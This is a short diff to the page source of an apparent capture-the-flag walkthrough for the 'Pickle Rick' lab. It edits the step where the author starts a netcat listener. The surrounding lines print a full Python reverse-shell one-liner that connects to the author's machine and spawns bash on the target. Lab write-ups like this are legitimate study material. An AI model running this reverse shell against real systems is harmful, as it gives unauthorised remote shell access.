@@ -68,7 +68,7 @@ portal.php   (Status: 302) [--> /login.php]
 
       step(9, "Start a listener and send a reverse shell",
         "<p>On my machine I start a listener:</p>" +
-        term({ ...K, cmds: ["nc -lvnp 1234"] }) +
+        term({ root: true, cwd: "/home/…/Desktop/Study/THM/Pickle_Rick_writeups", cmds: ["nc -lvnp 1234"] }) +
         "<p>In the command panel I send a Python reverse shell (revshells.com, Python3 #2):</p>" +
         term({ who: "panel", wrap: true, cmds: [`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.189",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'`] }) +
         fig("/images/pickle-rick/reverse-shell.png", "The listener catches the shell. whoami: www-data.") +
